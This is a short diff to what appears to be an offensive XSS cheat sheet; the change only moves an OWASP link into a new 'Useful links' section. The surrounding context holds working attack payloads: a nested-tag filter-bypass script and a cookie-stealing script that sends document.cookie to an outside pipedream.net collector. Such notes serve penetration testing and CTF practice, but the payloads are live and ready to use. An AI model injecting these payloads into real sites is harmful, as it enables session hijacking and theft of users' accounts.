@@ -20,8 +20,6 @@ Bypassing filters
 <scr<script>ipt>alert(1)</script>
 ```
 
-<https://owasp.org/www-community/xss-filter-evasion-cheatsheet>
-
 Stealing cookies:
 
 Use burp to bypass any length restrictions:
@@ -35,3 +33,8 @@ Exfiltration:
 ``` html
 <script>document.write('<img src="https://no0mubyk0uwwe.x.pipedream.net/?c='+document.cookie+'')</script>
 ```
+
+Useful links
+
+* <https://csp-evaluator.withgoogle.com/>
+* <https://owasp.org/www-community/xss-filter-evasion-cheatsheet>
